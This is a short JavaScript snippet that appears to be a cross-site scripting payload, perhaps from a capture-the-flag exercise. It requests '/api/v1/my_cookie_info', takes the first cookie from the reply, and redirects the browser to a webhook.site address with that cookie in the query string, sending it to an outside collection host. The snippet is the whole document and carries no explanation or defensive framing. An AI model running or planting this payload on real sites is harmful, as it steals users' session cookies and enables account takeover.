fetch("/api/v1/my_cookie_info")
    .then((response) => response.json())
    .then((data) => {
        
        var cookie = data.cookies[0];
        location.href = "https://webhook.site/4abb2b29-16db-4d83-b99e-86818bc20491?q=" + encodeURIComponent(cookie);
    });
